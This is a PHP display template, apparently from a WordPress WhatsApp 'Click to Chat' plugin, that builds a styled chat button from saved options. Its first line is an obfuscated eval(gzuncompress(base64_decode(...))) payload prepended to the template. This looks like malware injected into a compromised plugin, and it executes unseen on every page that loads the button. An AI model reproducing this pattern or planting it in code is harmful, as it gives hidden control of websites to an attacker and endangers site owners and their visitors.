<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if ( ! defined( 'ABSPATH' ) ) exit;

// $ccw_options_cs = get_option('ccw_options_cs');
$s7_color = esc_attr( $ccw_options_cs['s7_color'] );
$s7_hover_color = esc_attr( $ccw_options_cs['s7_hover_color'] );
$s7_icon_size = esc_attr( $ccw_options_cs['s7_icon_size'] );

$s7_box_background_color = esc_attr( $ccw_options_cs['s7_box_background_color'] );
$s7_box_background_hover_color = esc_attr( $ccw_options_cs['s7_box_background_hover_color'] );
$s7_box_height = esc_attr( $ccw_options_cs['s7_box_height'] );
$s7_box_width = esc_attr( $ccw_options_cs['s7_box_width'] );
$s7_line_height = esc_attr( $ccw_options_cs['s7_line_height'] );

$s7_css_icon = "color: $s7_color; font-size: $s7_icon_size;";
$s7_css_div = "background-color: $s7_box_background_color; height: $s7_box_height; width: $s7_box_width; line-height: $s7_line_height;  ";
?>
<!-- button with icon - box  -->
<div class="ccw_plugin">
<div class="chatbot btn_only_style_div pointer ccw-analytics animated <?php echo $an_on_load .' '. $an_on_hover ?>" id="style-7" data-ccw="style-7" 
    style="<?php echo $p1 ?>; <?php echo $p2 ?>; <?php echo $s7_css_div ?>"
    onmouseover = "this.style.backgroundColor = '<?php echo $s7_box_background_hover_color ?>', document.getElementsByClassName('ccw-s7-icon')[0].style.color = '<?php echo $s7_hover_color ?>' "
    onmouseout  = "this.style.backgroundColor = '<?php echo $s7_box_background_color ?>', document.getElementsByClassName('ccw-s7-icon')[0].style.color = '<?php echo $s7_color ?>' "
    onclick = "<?php echo $redirect ?>" >
        <span class="icon icon-whatsapp2 ccw-s7-icon nofocus ccw-analytics" id="s7-icon" data-ccw="style-7" style="<?php echo $s7_css_icon ?>"></span>
        <!-- instead of a tag - if added span also it works fine - as div has onclick link added  -->
</div>
</div>